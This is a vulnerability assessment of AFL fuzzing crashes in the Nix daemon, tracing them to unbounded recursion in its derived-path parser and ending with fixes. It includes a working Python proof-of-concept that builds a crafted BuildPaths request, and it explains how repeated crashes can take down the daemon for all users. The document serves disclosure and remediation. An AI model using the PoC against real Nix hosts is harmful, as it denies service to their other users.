# Security assessment: AFL crashes in `fuzz-daemon-message`

## Executive summary

The two crash artifacts in
`/tmp/opencode/nix-fuzz-parent/afl-out/default/crashes` are **the same bug**.
Both are stack exhaustion caused by unbounded recursion in Nix's daemon-side
`DerivedPath` parser. The recursion is reachable from the `BuildPaths` worker
protocol operation, before any trust or repair-mode check is performed.

**Verdict:** this is **not a memory-corruption or code-execution vulnerability**.
It is a **local denial-of-service** issue (CWE-674, uncontrolled recursion). A
user who is allowed to connect to the Nix daemon can send a crafted
`BuildPaths` request containing a derived-path string with enough `!` separators
to crash the per-connection daemon worker. Roughly 16,500–17,000 separator
bytes are sufficient with the default 8 MiB stack in this build.

The normal nix-daemon accepts a Unix-domain socket (default mode `0666`) and
defaults to `allowed-users = *`, so an unprivileged local user can reach this
path. The acceptor re-execs a fresh worker for every connection, so one crash
only kills that user's own worker. However, the acceptor aborts after 64 worker
crashes (`crashLimit = 64` in `src/nix/unix/daemon.cc`), so repeated malformed
connections can terminate the daemon acceptor for all users until it is
restarted (normally automatically by socket activation). There is no
confidentiality or integrity impact.

Typical severity: **Low** (local, availability-only, worker-isolated), rising to
**Medium** on hosts that depend continuously on the Nix daemon and lack rapid
automatic restart.

---

## Artifacts examined

| File | Size | AFL metadata |
| --- | ---: | --- |
| `id:000000,sig:11,src:000537,time:1844122,execs:3356703,op:havoc,rep:16` | 67,457 B | SIGSEGV, havoc mutation |
| `id:000001,sig:11,src:000352,time:2624085,execs:4712895,op:havoc,rep:7` | 29,948 B | SIGSEGV, havoc mutation |

Both were found with:

```text
afl-fuzz -i src/libstore-tests/fuzz/data/daemon-messages \
         -o /tmp/opencode/nix-fuzz-parent/afl-out \
         -x src/libstore-tests/fuzz/daemon-messages.dict \
         -- /tmp/opencode/nix-fuzz-parent/build-afl-deny/src/libstore-tests/fuzz/harnesses/fuzz-daemon-message
```

The harness (`src/libstore-tests/fuzz/daemon-message.cc`) feeds the bytes to the
real daemon request parser, `nix::daemon::processConnection`, using a
`DummyStore`, `Trusted`, and `RecursiveFlag::Recursive`. No real store path or
build is touched.

---

## Reproduction

### No-ASAN AFL build (used for gdb)

```text
/tmp/opencode/nix-fuzz-parent/build-afl-deny/src/libstore-tests/fuzz/harnesses/fuzz-daemon-message
```

Meson options: `b_sanitize=none`, AFL libFuzzer-compatible driver.

### ASAN/libFuzzer build

```text
LD_LIBRARY_PATH=/usr/lib/llvm-22/lib/clang/22/lib/linux \
ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-22/bin/llvm-symbolizer \
/tmp/opencode/nix-fuzz-parent/build-libfuzzer/src/libstore-tests/fuzz/harnesses/fuzz-daemon-message <input>
```

ASAN reports:

```text
ERROR: AddressSanitizer: stack-overflow
  #0 ...
  #1 __asan_memcpy
  #2 nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:127
  #3 nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:132
  #4+ repeated frames at derived-path.cc:132
```

The classification is **stack-overflow**, not heap-buffer-overflow,
use-after-free, or invalid free.

---

## GDB backtraces

Command used for both inputs:

```sh
gdb -nx -q -batch \
  -ex 'set pagination off' \
  -ex 'set print frame-arguments none' \
  -ex 'set print repeats 0' \
  -ex 'handle SIGPIPE nostop noprint pass' \
  -ex 'run "<crash-file>"' \
  -ex 'bt -30' \
  /tmp/opencode/nix-fuzz-parent/build-afl-deny/src/libstore-tests/fuzz/harnesses/fuzz-daemon-message
```

### Crash 1 — `id:000000`

```text
Thread 1 "fuzz-daemon-mes" received signal SIGSEGV, Segmentation fault.
0x00007ffff75b02e8 in std::basic_string_view<char, std::char_traits<char> >::rfind (
    this=..., __str=..., __pos=..., __n=...) at .../bits/string_view.tcc:100

#0  0x00007ffff75b02e8 in std::basic_string_view<char, std::char_traits<char> >::rfind(...) at .../string_view.tcc:100
#1  0x00007ffff75b01cd in std::basic_string_view<char, std::char_traits<char> >::rfind(...) at .../string_view:484
#2  0x00007ffff75a6762 in nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:127

#3 ... #16337  nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:132
                 (~16,335 recursive frames)

#16338 nix::parseWith(...) at ../src/libstore/derived-path.cc:160
#16339 nix::DerivedPath::parseLegacy(...) at ../src/libstore/derived-path.cc:174
#16340 nix::WorkerProto::Serialise<nix::DerivedPath>::read(...) at ../src/libstore/worker-protocol.cc:212
#16341 nix::LengthPrefixedProtoHelper<nix::WorkerProto, std::vector<nix::DerivedPath>>::read(...) at length-prefixed-protocol-helper.hh:75
#16342 nix::WorkerProto::Serialise<std::vector<nix::DerivedPath>>::read(...) at worker-protocol-impl.hh:29
#16343 nix::daemon::performOp(...) at ../src/libstore/daemon.cc:593
#16344 nix::daemon::processConnection(...) at ../src/libstore/daemon.cc:1236
#16345 LLVMFuzzerTestOneInput(...) at ../src/libstore-tests/fuzz/daemon-message.cc:116
#16346 ExecuteFilesOnyByOne()
#16347 LLVMFuzzerRunDriver()
#16348 main()
```

### Crash 2 — `id:000001`

The second input produces the identical stack:

```text
Thread 1 "fuzz-daemon-mes" received signal SIGSEGV, Segmentation fault.
0x00007ffff75b02e8 in std::basic_string_view<char, std::char_traits<char> >::rfind (...)

#0  std::basic_string_view<char, std::char_traits<char> >::rfind(...) at .../string_view.tcc:100
#1  std::basic_string_view<char, std::char_traits<char> >::rfind(...) at .../string_view:484
#2  nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:127
#3 ... #16337  nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:132
#16338 nix::parseWith(...) at ../src/libstore/derived-path.cc:160
#16339 nix::DerivedPath::parseLegacy(...) at ../src/libstore/derived-path.cc:174
#16340 nix::WorkerProto::Serialise<nix::DerivedPath>::read(...) at ../src/libstore/worker-protocol.cc:212
#16341 nix::LengthPrefixedProtoHelper<...>::read(...) at length-prefixed-protocol-helper.hh:75
#16342 nix::WorkerProto::Serialise<std::vector<nix::DerivedPath>>::read(...) at worker-protocol-impl.hh:29
#16343 nix::daemon::performOp(...) at ../src/libstore/daemon.cc:593
#16344 nix::daemon::processConnection(...) at ../src/libstore/daemon.cc:1236
#16345 LLVMFuzzerTestOneInput(...) at ../src/libstore-tests/fuzz/daemon-message.cc:116
#16346 ExecuteFilesOnyByOne()
#16347 LLVMFuzzerRunDriver()
#16348 main()
```

The only differences between the two runs were the writer-thread LWP ID and one
register value; the crash path and depth were the same.

---

## Root cause

`src/libstore/derived-path.cc`:

```cpp
static SingleDerivedPath parseWithSingle(
    const StoreDirConfig & store,
    std::string_view s,
    std::string_view separator,
    const ExperimentalFeatureSettings & xpSettings)
{
    size_t n = s.rfind(separator);                                  // line 127
    return n == s.npos
               ? (SingleDerivedPath) SingleDerivedPath::Opaque::parse(store, s)
               : (SingleDerivedPath) SingleDerivedPath::Built::parse(
                     store,
                     make_ref<const SingleDerivedPath>(
                         parseWithSingle(store, s.substr(0, n), separator, xpSettings)), // line 132
                     s.substr(n + 1),
                     xpSettings);
}
```

`parseWith()` at line 160 calls `parseWithSingle()` with separator `"!"`, and
`DerivedPath::parseLegacy()` at line 174 calls `parseWith()`.

For a wire string consisting of many `!` characters, `rfind("!")` always finds a
separator, so the function recurses on successively shorter prefixes. There is
no recursion-depth limit. Each frame is large enough that roughly 16.5k nested
calls exhaust the default 8 MiB stack.

The call from the daemon is:

```text
daemon.cc:593  auto drvs = WorkerProto::Serialise<DerivedPaths>::read(*store, rconn);
worker-protocol.cc:212  return DerivedPath::parseLegacy(store, s);
```

The `dynamic-derivations` experimental-feature check inside
`SingleDerivedPath::Built::parse()` (via `drvRequireExperiment`, line 101) is
evaluated only while unwinding, after the recursive descent has already
consumed the stack. It therefore does not prevent the crash.

---

## Minimal proof of concept

The harness input can be generated from the first 32 bytes of a valid seed
(magic, version 1.37, obsolete affinity and reserve fields), followed by the
`BuildPaths` opcode, a one-element vector, and a length-prefixed string of `!`
characters:

```python
import struct, pathlib

seed = pathlib.Path(
    'src/libstore-tests/fuzz/data/daemon-messages/is-valid-path.bin'
).read_bytes()[:32]

n = 17000
poc = bytearray(seed)
poc += struct.pack('<QQQ', 9, 1, n)      # op=BuildPaths, vector size=1, string length=n
poc += b'!' * n
poc += b'\0' * ((-n) % 8)                # wire padding to 8 bytes

pathlib.Path('/tmp/poc-buildpaths-stackoverflow.bin').write_bytes(poc)
```

Observed with the no-ASAN build under the default 8 MiB stack:

```text
n = 16000  -> exit 0
n = 16500  -> exit 139 (SIGSEGV)
n = 17000  -> exit 139 (SIGSEGV)
n = 20000  -> exit 139 (SIGSEGV)
```

The ASAN build crashes as well (confirmed at `n = 17000`) with
`AddressSanitizer: stack-overflow`. The exact threshold depends on stack rlimit
and compiler instrumentation.

---

## Reachability in a real Nix install

* The daemon listens on a Unix-domain socket, by default
  `/nix/var/nix/daemon-socket/socket`, created with mode `0666`
  (`src/libcmd/include/nix/cmd/unix-socket-server.hh:53`).
* `allowed-users` defaults to `*` (`src/nix/unix/daemon.cc:85-100`), so any local
  user can connect. Such users are normally `NotTrusted`, but that does not
  matter here: the `BuildPaths` drv vector is parsed at `daemon.cc:593` before
  the `bmRepair && !trusted` check at `daemon.cc:606`.
* For protocol version >= 1.30, `WorkerProto::Serialise<DerivedPath>::read`
  uses `DerivedPath::parseLegacy`, i.e. the `!` separator path.
* The acceptor spawns a fresh re-exec'd worker per connection
  (`src/nix/unix/daemon.cc:410-471`). A single malicious request therefore
  crashes only that connection's worker.
* The acceptor tracks signal crashes and throws `AbortServeSocket` after
  `crashLimit = 64` crashes (`src/nix/unix/daemon.cc:333,397-406`). Repeated
  connections from one user can therefore terminate the daemon acceptor for all
  users until it is restarted.

The daemon is not network-facing by default. Remote exploitation requires an
explicit TCP-to-Unix-socket forward or an authenticated stdio/ssh transport;
ordinary remote attackers cannot reach this code.

---

## Exploitability assessment

### Code execution / memory corruption: **No**

* ASAN classifies the fault as `stack-overflow`, not an out-of-bounds write or
  use-after-free.
* The stack grows one ordinary frame at a time into its guard page; the kernel
  delivers SIGSEGV before any adjacent mapping or return address is overwritten
  by attacker-controlled data.
* The payload only controls the *number* of recursion steps and the string
  contents, not a pointer or a write destination.
* Workers are re-exec'd per connection, giving fresh ASLR and limiting the blast
  radius of a crashed worker.

### Denial of service: **Yes, local and limited**

* Any local user permitted to connect to the daemon can crash their own worker
  with a ~17 KB request.
* With ~64 such connections, the acceptor exits, denying service to other users
  until systemd/socket activation or manual intervention restarts it.
* No store corruption, privilege escalation, or data disclosure was observed.

---

## Recommendations

1. Add an explicit recursion-depth limit to `parseWithSingle()` and `parseWith()`
   (for example 64 or 128 levels) and throw a normal `Error` when exceeded.
2. Prefer rewriting the parser as an iterative loop that repeatedly splits on
   the last separator and builds the nested representation on the way back.
3. Optionally cap the accepted length of a worker-protocol `DerivedPath` string
   in `WorkerProto::Serialise<DerivedPath>::read`.
4. Add a regression corpus entry containing a long `!`-only derived-path string
   to `src/libstore-tests/fuzz/data/daemon-messages/`.
5. Consider per-client crash accounting, or resetting the global crash counter,
   so a single abusive user cannot terminate the acceptor for everyone.
6. If reporting upstream, attach the two AFL artifacts and the minimal PoC
   generator above; both original crashes reduce cleanly to the same recursion
   bug.
